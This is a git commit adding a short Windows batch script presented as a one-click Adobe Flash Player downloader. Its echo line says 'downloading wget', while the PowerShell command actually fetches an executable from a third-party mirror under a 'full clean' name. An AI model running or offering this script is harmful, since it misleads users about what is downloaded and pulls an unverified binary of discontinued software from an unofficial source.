e017912020a30fa0c231bc6a26739db385d3e47e
系统远程维护工作室 <94363939+Control1980@users.noreply.github.com>
2023-08-31 11:56:18 +0800

    Add files via upload

---
+++ Adobe-Flash-Player-V295版本一键下载.bat
@@ -0,0 +1,4 @@
+@echo off
+echo "downloading wget"
+powershell -command "& { iwr https://dl002.liqucn.com/upload/2021/1518/s/s202102154529314b3a6a0d0df5de5d8877711a0dd9.exe -outfile Adobe-Flash-Player三方一键全清.exe}"
+cls
